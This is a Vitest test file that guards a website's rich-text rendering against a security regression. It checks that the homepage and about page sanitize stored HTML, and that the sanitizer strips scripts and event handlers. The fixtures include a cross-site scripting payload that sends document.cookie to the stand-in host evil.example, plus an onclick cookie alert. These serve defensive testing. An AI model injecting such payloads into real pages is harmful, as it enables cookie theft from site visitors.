import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { renderRichText } from "@/lib/sanitize-html";

/**
 * CLAUDE.md and the Stage 05 spec both require sanitizing rich text on
 * save AND on render (a historical row, or a direct database edit,
 * must never reach a visitor unsanitized). A /security-review during
 * Stage 05 found both public render sites skipping the render-time
 * pass entirely; these tests guard against that regression recurring.
 */

const HOMEPAGE_SOURCE = readFileSync(path.join(process.cwd(), "src/app/(site)/page.tsx"), "utf8");
const ABOUT_SOURCE = readFileSync(path.join(process.cwd(), "src/app/(site)/about/page.tsx"), "utf8");

describe("public rich text render sites use renderRichText", () => {
  it("homepage wraps hod.message in renderRichText before dangerouslySetInnerHTML", () => {
    expect(HOMEPAGE_SOURCE).toMatch(/dangerouslySetInnerHTML=\{\{\s*__html:\s*renderRichText\(hod\.message\)/);
  });

  it("about page wraps page.body in renderRichText before dangerouslySetInnerHTML", () => {
    expect(ABOUT_SOURCE).toMatch(/dangerouslySetInnerHTML=\{\{\s*__html:\s*renderRichText\(page\.body\)/);
  });

  it("about page wraps hod.message in renderRichText before dangerouslySetInnerHTML", () => {
    expect(ABOUT_SOURCE).toMatch(/dangerouslySetInnerHTML=\{\{\s*__html:\s*renderRichText\(hod\.message\)/);
  });

  it("neither render site passes hod.message or page.body straight to dangerouslySetInnerHTML unsanitized", () => {
    const rawInjection = /dangerouslySetInnerHTML=\{\{\s*__html:\s*(hod\.message|page\.body)\s*\}\}/;
    expect(HOMEPAGE_SOURCE).not.toMatch(rawInjection);
    expect(ABOUT_SOURCE).not.toMatch(rawInjection);
  });
});

describe("renderRichText strips a script payload at render time", () => {
  it("strips a <script> tag from stored content a public page would render", () => {
    const stored = '<p>Welcome</p><script>fetch("https://evil.example/steal?c="+document.cookie)</script>';
    const output = renderRichText(stored);
    expect(output).not.toMatch(/<script/i);
    expect(output).not.toContain("evil.example");
    expect(output).toContain("Welcome");
  });

  it("strips an inline event handler from stored content a public page would render", () => {
    const stored = '<p onclick="alert(document.cookie)">Click</p>';
    const output = renderRichText(stored);
    expect(output).not.toMatch(/onclick/i);
  });
});
